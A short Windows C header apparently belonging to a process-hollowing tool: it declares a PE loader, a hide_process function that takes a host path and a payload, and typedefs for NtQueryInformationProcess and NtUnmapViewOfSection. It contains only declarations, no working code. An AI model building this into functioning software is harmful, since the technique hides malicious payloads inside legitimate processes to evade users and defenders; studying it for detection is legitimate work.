#ifndef HIDE_PROCESS
#define HIDE_PROCESS

#pragma once
#include <windows.h>
#include <winternl.h>

LPVOID load_pe_from_file(LPCWSTR path, DWORD *outSize);
BOOL hide_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize);

typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(
	HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(
	HANDLE, PVOID);

#endif